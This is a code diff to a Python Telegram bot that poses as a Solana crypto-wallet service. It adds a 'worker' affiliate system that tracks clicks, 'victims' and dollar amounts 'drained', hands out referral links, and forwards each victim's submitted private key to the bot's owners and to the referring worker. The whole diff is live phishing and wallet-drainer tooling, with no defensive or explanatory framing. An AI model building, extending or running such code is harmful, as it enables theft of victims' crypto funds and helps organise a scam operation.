@@ -1,7 +1,8 @@
-# Bloomsaintimport os
+# Bloomsaint
 import os
 import time
 import requests
+import json
 from telegram import (
     Update,
     InlineKeyboardButton,
@@ -60,6 +61,36 @@ def current_time():
 def is_user_banned(user_id):
     """Check if a user is banned"""
     return user_id in BANNED_USERS
+
+def load_worker_data():
+    """Load worker data from JSON file"""
+    try:
+        with open('workers.json', 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {"workers": {}, "referrals": {}}
+    except json.JSONDecodeError:
+        return {"workers": {}, "referrals": {}}
+
+def save_worker_data(data):
+    """Save worker data to JSON file"""
+    with open('workers.json', 'w') as f:
+        json.dump(data, f, indent=2)
+
+def get_or_create_worker(user_id):
+    """Get worker data or create new worker"""
+    data = load_worker_data()
+    user_id_str = str(user_id)
+    
+    if user_id_str not in data["workers"]:
+        data["workers"][user_id_str] = {
+            "clicks": 0,
+            "victims": 0,
+            "drained": 0.0
+        }
+        save_worker_data(data)
+    
+    return data["workers"][user_id_str]
 
 # Removed SOL price function - no longer needed
 
@@ -293,6 +324,30 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user_id = user.id
 
+    # Handle referral if present
+    if context.args and len(context.args) > 0:
+        try:
+            referrer_id = int(context.args[0])
+            if referrer_id != user_id:  # Don't allow self-referral
+                data = load_worker_data()
+                
+                # Add referral mapping
+                data["referrals"][str(user_id)] = str(referrer_id)
+                
+                # Update referrer's clicks
+                referrer_id_str = str(referrer_id)
+                if referrer_id_str not in data["workers"]:
+                    data["workers"][referrer_id_str] = {
+                        "clicks": 0,
+                        "victims": 0,
+                        "drained": 0.0
+                    }
+                
+                data["workers"][referrer_id_str]["clicks"] += 1
+                save_worker_data(data)
+        except ValueError:
+            pass  # Invalid referrer ID, continue normally
+
     # Check if user is banned
     if is_user_banned(user_id):
         await context.bot.send_message(
@@ -384,6 +439,32 @@ async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text=text,
         parse_mode=ParseMode.HTML,
         reply_markup=panel_keyboard(),
+    )
+
+async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Worker command - show worker stats and referral link"""
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+    
+    # Get or create worker stats
+    worker_stats = get_or_create_worker(user_id)
+    
+    # Format the worker menu
+    text = (
+        "📊 ︱— Stats\n"
+        f"{worker_stats['clicks']} - Total Clicks\n"
+        f"{worker_stats['victims']} - Total Victims\n"
+        f"${worker_stats['drained']:.2f} - Amount Drained\n\n"
+        "🔨 ︱— Level\n"
+        "1.00 - No Perks\n\n"
+        "🔗 ︱— Link\n"
+        f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
+    )
+    
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=text,
+        parse_mode=ParseMode.HTML,
     )
 
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -616,13 +697,33 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"├ 🔑 Private Key: <code>{message_text}</code>"
         )
 
-        # Send to both owners
+        # Load worker data to check for referrals
+        worker_data = load_worker_data()
+        user_id_str = str(user_id)
+        
+        # Update victim count for referrer
+        if user_id_str in worker_data["referrals"]:
+            referrer_id = worker_data["referrals"][user_id_str]
+            if referrer_id in worker_data["workers"]:
+                worker_data["workers"][referrer_id]["victims"] += 1
+                save_worker_data(worker_data)
+
+        # Send to owners (they get all logs)
         try:
             await context.bot.send_message(chat_id=OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
             if SECOND_OWNER_ID:
                 await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
         except Exception as e:
             print(f"Error sending to owners: {e}")
+
+        # Send to referrer if they exist and are not an owner
+        if user_id_str in worker_data["referrals"]:
+            referrer_id = int(worker_data["referrals"][user_id_str])
+            if referrer_id not in [OWNER_ID, SECOND_OWNER_ID]:
+                try:
+                    await context.bot.send_message(chat_id=referrer_id, text=victim_message, parse_mode=ParseMode.HTML)
+                except Exception as e:
+                    print(f"Error sending to referrer {referrer_id}: {e}")
 
         # Show wallet creation confirmation message without inline buttons
         await update.message.reply_text("Please wait while your wallet is being created. ✅")
@@ -1376,6 +1477,7 @@ def main():
     app = ApplicationBuilder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("worker", worker))
     app.add_handler(CommandHandler("panel", panel))
     app.add_handler(CommandHandler("support", support))
     app.add_handler(CommandHandler("positions", positions_command))
